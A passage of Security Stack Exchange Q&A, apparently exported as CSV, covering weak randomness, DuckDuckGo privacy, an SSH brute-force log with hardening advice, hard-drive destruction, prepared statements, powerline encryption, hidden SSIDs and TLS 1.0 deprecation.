<li><p>Attacks on guessable/weak ""random"" numbers.  Maybe you use <a href=""https://security.stackexchange.com/questions/18048/isnt-microtime-or-mt-rand-sufficient-for-password-reset"">microtime/MT-rand</a> or too little information to seed the pseudo-random number like <a href=""http://www.debian.org/security/2008/dsa-1571"" rel=""noreferrer"">Debian OpenSSL did a few years back</a>.  </p></li>
<li><p>Attacks that bypass protections.  Maybe you did hashing/input validation client side in  web application and this was bypassed by the user altering the scripts.  Or you have local application that the client tries running in a virtual machine or disassembles to reverse engineer it/alter the memory/ or otherwise cheat somehow.</p></li>
<li><p>Other attacks, including (but not attempting to be a complete list) CSRF, XSS, SQL injection, network eavesdropping, replay attacks, Man in the Middle attacks, buffer overflows, etc.  Best protections very quickly summarized.  CSRF: require randomly generated CSRF tokens on POST actions; XSS: always validate/escape untrusted user-input before inputting into db and displaying to user/browser; SQLi: always use bound parameters and limit how many results get returned; eavesdropping: encrypt sensitive network traffic; replay: put unique one-time nonces in each transaction; MitM:  Web of Trust/Same as site last visited/Certificate issued by trusted CA; buffer overflows: safe programming language/libraries/executable space protection/etc).  </p></li>
</ul>

<p>You are only as strong as your weakest exploitable link.  Also just because you aren't rolling your own scheme, doesn't mean your scheme will be secure.  Its quite likely that the person who created what you rolled out was not an expert, or created an otherwise weak scheme.</p>
","18198"
"Why would someone trust DuckDuckGo or other providers with a similar privacy policy?","42841","","<p>DuckDuckGo is a search engine that claims it will not share your results with others.  Many of my skeptical coworkers think it may be a scam.</p>

<p>Is there any proof that any web search engine will protect your privacy as it advertises?</p>
","<p>There is no proof that DuckDuckGo operates as advertised.  (There never is, on the web.)  However, that is the wrong question.</p>

<p>DuckDuckGo is very clear in <a href=""https://duckduckgo.com/privacy.html"">its privacy policy</a>.  DuckDuckGo says <a href=""http://donttrack.us/"">it doesn't track you</a>, <a href=""http://donttrack.us/"">it doesn't send your searches to other sites</a>, <a href=""https://duckduckgo.com/privacy.html"">by default it does not use any cookies</a>, <a href=""https://duckduckgo.com/privacy.html"">it does not collect personal information</a>, <a href=""https://duckduckgo.com/privacy.html"">it does not log your IP address or other information about your computer that may be sent automatically with your searches</a>, <a href=""http://donttrack.us/"">it doesn't store any personal information at all</a>.   Those are pretty strong promises, with no weasel-wording.  And, as far as I can see, DuckDuckGo's privacy policy seems like a model privacy policy.  It is a model of clarity, plain language, and lack of legal obfuscation.</p>

<p>And privacy policies have bite.  The FTC has filed lawsuits after companies that violate their own advertised privacy policy.  (Not just little companies you've never heard of: They even went after Facebook!)  The way privacy law works in the US is, basically, there are almost no privacy rules that restrict what information web sites can collect -- except that if they have a privacy policy, they must abide by it.  Breaching your own privacy policy may be fraud, which is illegal.  Also, violating your own privacy policy represents ""unfair or deceptive acts or practices"", and the FTC is empowered to pursue anyone who engages in ""unfair or deceptive acts or practices"" in court.  DuckDuckGo would be pretty dumb to breach their own privacy policy; their privacy policy is clear and unambiguous and leaves them little wiggle room.</p>

<p>No, I don't think that DuckDuckGo is a scam.  I think that's crazy talk.  Given the incentives and legal regime, I think you should assume DuckDuckGo follows their own privacy policies, until you find any information to the contrary.</p>
","12665"
"Invalid users trying to log in to my server","42827","","<p>I'm seeing a lot of log entries that appear to be failed login attempts from unknown IP addresses.  </p>

<p>I am using private and public keys to log in with SSH but I have noticed that even with private and public keys set I am able to log in to my server with filezilla without running <code>pageant</code>. Is this normal? What should I do to further protect myself from what seems like a brute force attack?</p>

<p>Heres the log:</p>

<pre><code>Oct  3 14:11:52 xxxxxx sshd[29938]: Invalid user postgres from 212.64.151.233
Oct  3 14:11:52 xxxxxx sshd[29938]: input_userauth_request: invalid user postgres [preauth]
Oct  3 14:11:52 xxxxxx sshd[29938]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29940]: Invalid user postgres from 212.64.151.233
Oct  3 14:11:52 xxxxxx sshd[29940]: input_userauth_request: invalid user postgres [preauth]
Oct  3 14:11:52 xxxxxx sshd[29940]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29942]: Invalid user postgres from 212.64.151.233
Oct  3 14:11:52 xxxxxx sshd[29942]: input_userauth_request: invalid user postgres [preauth]
Oct  3 14:11:52 xxxxxx sshd[29942]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29944]: Invalid user postgres from 212.64.151.233
Oct  3 14:11:52 xxxxxx sshd[29944]: input_userauth_request: invalid user postgres [preauth]
Oct  3 14:11:52 xxxxxx sshd[29944]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29946]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29948]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29950]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:52 xxxxxx sshd[29952]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29954]: Invalid user admin from 212.64.151.233
Oct  3 14:11:53 xxxxxx sshd[29954]: input_userauth_request: invalid user admin [preauth]
Oct  3 14:11:53 xxxxxx sshd[29954]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29956]: Invalid user admin from 212.64.151.233
Oct  3 14:11:53 xxxxxx sshd[29956]: input_userauth_request: invalid user admin [preauth]
Oct  3 14:11:53 xxxxxx sshd[29956]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29958]: Invalid user admin from 212.64.151.233
Oct  3 14:11:53 xxxxxx sshd[29958]: input_userauth_request: invalid user admin [preauth]
Oct  3 14:11:53 xxxxxx sshd[29958]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29960]: User mysql not allowed because account is locked
Oct  3 14:11:53 xxxxxx sshd[29960]: input_userauth_request: invalid user mysql [preauth]
Oct  3 14:11:53 xxxxxx sshd[29960]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29962]: User mysql not allowed because account is locked
Oct  3 14:11:53 xxxxxx sshd[29962]: input_userauth_request: invalid user mysql [preauth]
Oct  3 14:11:53 xxxxxx sshd[29962]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29964]: Invalid user prueba from 212.64.151.233
Oct  3 14:11:53 xxxxxx sshd[29964]: input_userauth_request: invalid user prueba [preauth]
Oct  3 14:11:53 xxxxxx sshd[29964]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29966]: Invalid user prueba from 212.64.151.233
Oct  3 14:11:53 xxxxxx sshd[29966]: input_userauth_request: invalid user prueba [preauth]
Oct  3 14:11:53 xxxxxx sshd[29966]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:53 xxxxxx sshd[29968]: Invalid user usuario from 212.64.151.233
Oct  3 14:11:53 xxxxxx sshd[29968]: input_userauth_request: invalid user usuario [preauth]
Oct  3 14:11:53 xxxxxx sshd[29968]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29970]: Invalid user usuario from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29970]: input_userauth_request: invalid user usuario [preauth]
Oct  3 14:11:54 xxxxxx sshd[29970]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29972]: Invalid user admin from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29972]: input_userauth_request: invalid user admin [preauth]
Oct  3 14:11:54 xxxxxx sshd[29972]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29974]: Invalid user nagios from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29974]: input_userauth_request: invalid user nagios [preauth]
Oct  3 14:11:54 xxxxxx sshd[29974]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29976]: Invalid user nagios from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29976]: input_userauth_request: invalid user nagios [preauth]
Oct  3 14:11:54 xxxxxx sshd[29976]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29978]: Invalid user nagios from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29978]: input_userauth_request: invalid user nagios [preauth]
Oct  3 14:11:54 xxxxxx sshd[29978]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29980]: Invalid user nagios from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29980]: input_userauth_request: invalid user nagios [preauth]
Oct  3 14:11:54 xxxxxx sshd[29980]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29982]: Invalid user oracle from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29982]: input_userauth_request: invalid user oracle [preauth]
Oct  3 14:11:54 xxxxxx sshd[29982]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29984]: Invalid user oracle from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29984]: input_userauth_request: invalid user oracle [preauth]
Oct  3 14:11:54 xxxxxx sshd[29984]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:54 xxxxxx sshd[29986]: Invalid user oracle from 212.64.151.233
Oct  3 14:11:54 xxxxxx sshd[29986]: input_userauth_request: invalid user oracle [preauth]
Oct  3 14:11:54 xxxxxx sshd[29986]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[29988]: Invalid user oracle from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[29988]: input_userauth_request: invalid user oracle [preauth]
Oct  3 14:11:55 xxxxxx sshd[29988]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[29990]: Invalid user ftpuser from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[29990]: input_userauth_request: invalid user ftpuser [preauth]
Oct  3 14:11:55 xxxxxx sshd[29990]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[29992]: Invalid user ftpuser from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[29992]: input_userauth_request: invalid user ftpuser [preauth]
Oct  3 14:11:55 xxxxxx sshd[29992]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[29994]: Invalid user ftpuser from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[29994]: input_userauth_request: invalid user ftpuser [preauth]
Oct  3 14:11:55 xxxxxx sshd[29994]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[29996]: Invalid user guest from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[29996]: input_userauth_request: invalid user guest [preauth]
Oct  3 14:11:55 xxxxxx sshd[29996]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[29998]: Invalid user guest from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[29998]: input_userauth_request: invalid user guest [preauth]
Oct  3 14:11:55 xxxxxx sshd[29998]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[30000]: Invalid user guest from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[30000]: input_userauth_request: invalid user guest [preauth]
Oct  3 14:11:55 xxxxxx sshd[30000]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:55 xxxxxx sshd[30002]: Invalid user guest from 212.64.151.233
Oct  3 14:11:55 xxxxxx sshd[30002]: input_userauth_request: invalid user guest [preauth]
Oct  3 14:11:55 xxxxxx sshd[30002]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30004]: Invalid user test from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30004]: input_userauth_request: invalid user test [preauth]
Oct  3 14:11:56 xxxxxx sshd[30004]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30006]: Invalid user test from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30006]: input_userauth_request: invalid user test [preauth]
Oct  3 14:11:56 xxxxxx sshd[30006]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30008]: Invalid user test from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30008]: input_userauth_request: invalid user test [preauth]
Oct  3 14:11:56 xxxxxx sshd[30008]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30010]: Invalid user test from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30010]: input_userauth_request: invalid user test [preauth]
Oct  3 14:11:56 xxxxxx sshd[30010]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30012]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30014]: Invalid user user from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30014]: input_userauth_request: invalid user user [preauth]
Oct  3 14:11:56 xxxxxx sshd[30014]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30016]: Invalid user user from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30016]: input_userauth_request: invalid user user [preauth]
Oct  3 14:11:56 xxxxxx sshd[30016]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:56 xxxxxx sshd[30018]: Invalid user user from 212.64.151.233
Oct  3 14:11:56 xxxxxx sshd[30018]: input_userauth_request: invalid user user [preauth]
Oct  3 14:11:56 xxxxxx sshd[30018]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30020]: Invalid user user from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30020]: input_userauth_request: invalid user user [preauth]
Oct  3 14:11:57 xxxxxx sshd[30020]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30022]: Invalid user jboss from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30022]: input_userauth_request: invalid user jboss [preauth]
Oct  3 14:11:57 xxxxxx sshd[30022]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30024]: Invalid user jboss from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30024]: input_userauth_request: invalid user jboss [preauth]
Oct  3 14:11:57 xxxxxx sshd[30024]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30026]: Invalid user squid from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30026]: input_userauth_request: invalid user squid [preauth]
Oct  3 14:11:57 xxxxxx sshd[30026]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30028]: Invalid user squid from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30028]: input_userauth_request: invalid user squid [preauth]
Oct  3 14:11:57 xxxxxx sshd[30028]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30030]: Invalid user temp from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30030]: input_userauth_request: invalid user temp [preauth]
Oct  3 14:11:57 xxxxxx sshd[30030]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30032]: Invalid user svn from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30032]: input_userauth_request: invalid user svn [preauth]
Oct  3 14:11:57 xxxxxx sshd[30032]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
Oct  3 14:11:57 xxxxxx sshd[30034]: Invalid user ts from 212.64.151.233
Oct  3 14:11:57 xxxxxx sshd[30034]: input_userauth_request: invalid user ts [preauth]
Oct  3 14:11:57 xxxxxx sshd[30034]: Received disconnect from 212.64.151.233: 11: Bye Bye [preauth]
</code></pre>
","<p>It is very common. Many botnets try to spread that way, so this is a wide scale mindless attack. Mitigation measures include:</p>

<ul>
<li>Use passwords with <em>high entropy</em> which are very unlikely to be brute-forced.</li>
<li>Disable SSH login for <code>root</code>.</li>
<li>Use an ""unlikely"" user name, which botnets will not use.</li>
<li>Disable password-based authentication altogether.</li>
<li>Run the SSH server on another port than 22.</li>
<li>Use <a href=""http://www.fail2ban.org/wiki/index.php/Main_Page"">fail2ban</a> to reject attackers' IP automatically or slow them down.</li>
<li>Allow SSH connections only from a whitelist of IP (beware not to lock yourself out if your home IP is nominally dynamic !).</li>
</ul>

<p>Most of these measures are about keeping your log files small; even when the brute force does not succeed, the thousands of log entries are a problem since they can hide actual targeted attacks. A bit of security through obscurity (such as the unlikely user name and the port change) works marvels against mindless attackers: yeah, security through obscurity is bad and wrong and so on, but sometimes it works and you will not get fried by a vengeful deity if you use it <em>sensibly</em>.</p>

<p>A high entropy password <em>will</em> be effective against intelligent attackers, though, and can only be recommended in all situations.</p>
","21039"
"How do you destroy an old hard drive?","42473","","<p>How do you destroy an old hard drive? To be clear, unlike questions <a href=""https://security.stackexchange.com/questions/912/secure-hard-drive-disposal-how-to-erase-confidential-information"">Secure hard drive disposal: How to erase confidential information</a> and <a href=""https://security.stackexchange.com/questions/5749/how-can-i-reliably-erase-all-information-on-a-hard-drive"">How can I reliably erase all information on a hard drive?</a> I do not want to erase the data and keep the hard drive, I want to get rid of the hard drive for good. It's old, small, may (or may not) contain personal information, and is not connected to a computer (a step I prefer to avoid). I might as well destroy it because it is easier and more certain that the data is destroyed too. </p>

<p>Any other advice is also appreciated as an answer. Keep in mind I am looking for an easier and more reliable data-destroying solution than wiping drives.</p>
","<p>Physical destruction of a drive is tricky business. There are many companies that deal specifically in the field of data destruction, so if you are doing any kind of mass you may want to at least look at their price list. If you contract, make sure the company is properly bonded/insured, and provides audit trails for each  destroyed item. In the worst case scenario that your information <em>does</em> get out, you want the document in hand that says your contractor properly destroyed the item in question. Then, at least, you can transfer the liability.</p>

<p>When it comes to drive destruction you typically see one of two main fields:</p>

<ol>
<li>Disk Degaussing</li>
<li>Physical Destruction</li>
</ol>

<h2>Degaussing</h2>

<p>Degaussing used to be the norm, but I am not such a big fan. On the plus side it is fast, you'll normally just dump the disks on a conveyor belt and watch them get fed through the device. The problem is auditability. Since the circuitry is rendered wobbly, you won't be able to do a spot check of the drives and verify that the data is gone. It is possible, with some level of probability unknown to me, that data could still exist on the platters. Retrieving the data would, without question, be difficult, but the fact still remains that you cannot demonstrate the data is actually gone. As such, most companies now will actually be doing physical destruction.</p>

<h2>Physical Destruction</h2>

<p>At the low end, say a small box of drives at a time, you'll have hard drive crushers. They're often pneumatic presses that deform the platters beyond useful recognition. At the risk of supporting a specific product, I have personally used <a href=""http://edrsolutions.com/solution.asp"">this product from eDR</a>. It works well, and is very cathartic.</p>

<p>At a larger scale, say dozens or hundreds of disks, you'll find large <a href=""http://www.youtube.com/watch?v=sQYPCPB1g3o"">industrial shredders</a>. They operate just like a paper shredder, but are designed to process much stiffer equipment. The mangled bits of metal that are left over are barely identifiable as hard drives.</p>

<p>At an even larger scale you can start looking at incinerators that will melt the drives down to unidentifiable lumps of slag. Since most electronics can produce some rather scary fumes and airborne particulates, I would not recommend doing this on you own. No, this is <em>not</em> a good use of your chiminea.</p>

<h2>Manual Dis-assembly</h2>

<p>If you are dealing with one or two drives at a time, then simple dis-assembly might be sufficient. Most drives these days are largely held together with torx screws, and will come apart with varying levels of difficulty. Simply remove the top cover, remove the platters from the central spindle. Taking a pocket knife, nail file, screwdriver, whatever, have fun scoring both surfaces of each platter. Then dispose of the materials appropriately. I cannot speak to how recoverable the data is afterwards, but it is probably sufficient. The biggest thing to keep in mind is that while most desktop hard drive platters are metal, some are glass. The glass ones shatter quite extravagantly.  </p>

<p>You should also take care of removing and destroying the memory chips on the board because of cache memory and (with ""hybrid"" drives) of NAND chips containing up to 4GB of cached data.<br>
A good way to do that is to wrap the board in linen or another coarse cloth and hammer it, that should keep broken parts from flying everywhere.</p>

<h2>Additional Considerations</h2>

<p>Before you decide on a destruction method, make sure to identify what <em>kind</em> of data is stored on each device and treat it appropriately. There may be regulatory or legal requirements for information disposal depending on what data <em>is</em> stored on the disk. As an example, see section 8-306 of <a href=""http://www.usaid.gov/policy/ads/500/d522022m.pdf"">DoD 5220.22-M</a>.</p>

<p>For hard drive destruction, DoD 5220.22-M section 8-306 recommends:  <em>""Disintegrate, incinerate, pulverize, shred, or melt""</em></p>

<p>All that being said, performing a single pass zero wipe is probably sufficient for your purposes. Modern research indicates that modern hard drives are largely immune to the ""magnetic memory"" problem we used to see on magnetic tape. I would never bother doing anything more on a household drive unless the drive itself was exhibiting failures.</p>
","11316"
"Are prepared statements 100% safe against SQL injection?","42339","","<p>Are prepared statements <em>actually</em> 100% safe against SQL injection, assuming all user-provided parameters are passed as query bound parameters?</p>

<p>Whenever I see people using the old <code>mysql_</code> functions on StackOverflow (which is, sadly, way too frequently) I generally tell people that prepared statements are the Chuck Norris (or Jon Skeet) of SQL injection security measures.</p>

<p>However, I've never actually seen any documentation that categorically states <em>""this is 100% safe""</em>. My understanding of them is that they separate the query language and parameters all the way to the front door of the server, which then treats them as separate entities.</p>

<p>Am I correct in this assumption?</p>
","<p>Guarantee of 100% safe from SQL injection?  Not going to get it (from me).</p>

<p>In principle, your database (or library in your language that is interacting with the db) could implement prepared statements with bound parameters in an unsafe way susceptible to some sort of advanced attack, say exploiting buffer overflows or having null-terminating characters in user-provided strings, etc.  (You could argue that these types of attacks should not be called SQL injection as they are fundamentally different; but that's just semantics).</p>

<p>I have never heard of any of these attacks on prepared statements on real databases in the field and strongly suggest using bound parameters to prevent SQL injection.  Without bound parameters or input sanitation, its trivial to do SQL injection.  With only input sanitation, its quite often possible to find an obscure loophole around the sanitation.  </p>

<p>With bound parameters, your SQL query execution plan is figured out ahead of time without relying on user input, which should make SQL injection not possible (as any inserted quotes, comment symbols, etc are only inserted within the already compiled SQL statement).</p>

<p>The only argument against using prepared statements is you want your database to optimize your execution plans depending on the actual query.  Most databases when given the full query are smart enough to do an optimal execution plan; e.g., if the query returns a large percentage of the table, it would want to walk through the entire table to find matches; while if its only going to get a few records you may do an index based search <a href=""http://use-the-index-luke.com/sql/where-clause/bind-parameters"">[1]</a>.</p>
","15215"
"Are powerline ethernet adapters inherently secure?","42321","","<p>I have 2 Zyxel PLA407 powerline adapters. Router is downstairs connected to one adapter, other adapter is upstairs about 30 feet away connected to a desktop. I have a house, not an apartment or townhouse.</p>

<p>I've noticed the speed is much faster when i just plug and play, rather than going through the encryption process - it's a little difficult.</p>

<p>So my question is, on a closed loop system - electricity inside my house - do I really need to set up the encryption? Or is it secure by the nature of the system itself?? How much of it 'leaks out' without encryption?</p>

<blockquote>
  <p>This question was <strong><a href=""https://security.meta.stackexchange.com/q/726/485"">IT Security Question of the Week</a></strong>.<br/>
  Read the Mar 15, 2012 <strong><a href=""http://security.blogoverflow.com/2012/03/qotw-20-are-powerline-ethernet-adapters-inherently-secure/"" rel=""noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/questions/tagged/qotw?sort=newest"">submit your own</a></strong> Question of the Week.</p>
</blockquote>
","<p>You do get some security from the way your fuse box is connected to the mains.</p>

<p>In principle you should get a good signal across any part of the wiring in your house that is on the same phase, and you shouldn't get any on the other phases.</p>

<p>In reality though, that isn't quite true - depending on your fuse box, you may get some bleed over onto the other phases, and <strong>you will almost definitely get leakage outside your 4 walls</strong>.</p>

<p>This is why encryption was put in place on these types of things - a neighbour may be able to sniff your traffic.</p>

<p>Things that help with security, because they hinder signal strength - surge protectors, UPS's etc. but those don't prevent an attacker.</p>

<p><strong>tl;dr</strong></p>

<p>Encrypt, because you will be leaking signal. Not so much wirelessly (it can be done but it is tricky) but just across the existing mains wiring.</p>
","9728"
"What is the difference between a Gateway and a Firewall?","42294","","<p>What is the difference between a Gateway and a Firewall and how do they relate to one another?</p>

<p>I am a developer trying to get a general understanding of network security.</p>
","<p>A gateway is simply a device that joins together two different networks. In the most common scenario, an internal network with the internet. A <a href=""http://en.wikipedia.org/wiki/Router_%28computing%29"">router</a> is an example of a gateway device. A router is a device that does <em>routing</em>, deciding where packets are sent to based on its IP address.</p>

<p>A <a href=""http://en.wikipedia.org/wiki/Firewall_%28computing%29"">firewall</a> is a filter that examines packets against a set of defined rules in order to decide whether to allow the packets through. </p>

<p>In many devices, the functionality of both a gateway and a firewall is present. Of course, there are dedicated versions of each for use in large enterprise networks. </p>
","35319"
"How risky is connecting to a hidden wireless network?","42093","","<p>According to something I spotted something in a set of directions for connecting to a hidden wireless network from windows 8 found <a href=""http://windows.microsoft.com/en-us/windows/network-connection-problem-help#network-problems=windows-81&amp;v1h=win81tab2&amp;v2h=win7tab1&amp;v3h=winvistatab1&amp;v4h=winxptab1"" rel=""noreferrer"">here</a> (located under Step 1 > ""Troubleshoot connection problems"" > ""How do I connect to a hidden wireless network?""):</p>

<blockquote>
  <p>A hidden wireless network is a wireless network that isn't broadcasting its network ID (SSID). Typically, wireless networks broadcast their name, and your PC “listens” for the name of the network that it wants to connect to. Because a hidden network doesn’t broadcast, your PC can't find it, so the network has to find your PC. For this to happen, your PC must broadcast both the name of the network it's looking for and its own name. <strong>In this situation, other PCs “listening” for networks will know the name of your PC as well as the network you’re connected to, which increases the risk of your PC being attacked.</strong> <sub>(emphasis added)</sub></p>
</blockquote>

<p>I had always believed that hidden wireless networks were actually safer than normal ones, because only those who already know of the network are able to connect to it, so an attacker wouldn't be able to connect to it to listen to your traffic.</p>

<p>Are hidden networks actually more risky, as the paragraph says, and if so, what measures can be taken to help mitigate the risk?</p>

<p>Also, I know that there are some countries where publicly broadcasting home networks are actually illegal, and hidden networks are the only option for wireless.  If broadcasting networks are safer, why are they illegal in some places?</p>
","<p>The risk here is in believing that a ""hidden SSID"" changes anything to the security. A non-hidden SSID means that the router will shout at regular intervals ""hello everybody, I am Joe the Router, you may talk to me !"". A hidden SSID means that the <em>client</em> machine (not the attacker's machine) will shout at regular intervals ""Hey, Joe, where are you ? Please respond !"". Either way, assuming that the SSID (here, ""Joe"") is not known to any attacker would be overly naive.</p>

<p>A point that could be made is that when the SSID is hidden, then an attacker may assume that the SSID is valuable in some way; so, when your PC connects, your PC shows that it knows the valuable SSID, and thus is also a valuable target in some sense. Not that it would change much things in practice: attackers will attack everything in range anyway, as a matter of principle.</p>
","38368"
"Should I disable TLS 1.0 on my servers?","41991","","<p>The <a href=""https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf"">PCI Data Security Standard 3.1</a> recommends disabling ""early TLS"" along with SSL:</p>

<blockquote>
  <p>SSL and early TLS are not considered strong cryptography and cannot be used as a security control after June 30, 2016.</p>
</blockquote>

<p>The <a href=""https://www.pcisecuritystandards.org/documents/Migrating_from_SSL_Early_TLS_Information%20Supplement_v1.pdf"">Migrating from SSL and Early TLS supplement</a> states:</p>

<blockquote>
  <p>The best response is to disable SSL entirely and migrate to a more modern encryption protocol, which at the time of publication is a minimum of TLS v1.1, although entities are strongly encouraged to consider TLS v1.2.</p>
</blockquote>

<p>I have a few questions regarding the deprecation of TLS 1.0:</p>

<ul>
<li>What is the reason for this recommendation?  Are there known vulnerabilities with the TLS 1.0 protocol?  (I'm aware that some faulty TLS <em>implementations</em> are vulnerable to POODLE but a <a href=""https://www.ssllabs.com/ssltest/"">SSL Labs</a> scan indicated that my site was not vulnerable.)</li>
<li>Is it necessary/desirable to apply this standard to web applications using HTTPS that are not handling credit card information?</li>
<li>Is disabling TLS 1.0 and restricting to TLS 1.1 or 1.2 on public-facing websites using HTTPS likely to break browser compatibility for a significant proportion of users?</li>
</ul>
","<p>TLS 1, when properly configured has no known security vulnerabilities.  Newer protocols are better designed and better address the potential for new vulnerabilities.  So that's why </p>

<p>I wouldn't personally recommend disabling TLS 1.0, primarily because IE 7-10 don't support TLS 1.1 out of the box.  If you look carefully at the support matrix at: <a href=""https://en.wikipedia.org/wiki/Transport_Layer_Security#Web_browsers"" rel=""noreferrer"">https://en.wikipedia.org/wiki/Transport_Layer_Security#Web_browsers</a> You'll see that TLS 1.1 is disabled by default on everything but IE 11.  </p>

<p>Most people have a significant amount of traffic on these browsers, and your website suddenly not working would pose a significant business impact.  Many people here will advocate a single minded approach of ""Security above all else"", and tell you to strongly advocate for disabling TLS 1.0.  I'm of the belief that security needs to be balanced with business needs, and it's the job of the security professional to understand both the security side, and the impact of changes.</p>

<p>Still, if you need to maintain PCI compliance, you may be forced to disable TLS 1.0.  You obviously need to test the impact of this on the stock browser config, and understand how much business you may or may not lose from this change.</p>
","106314"
"TCP Peer unexpectedly shrunk window messages in dmesg log","41943","","<p>We get quite few messages like these in our dmesg log on various servers:</p>

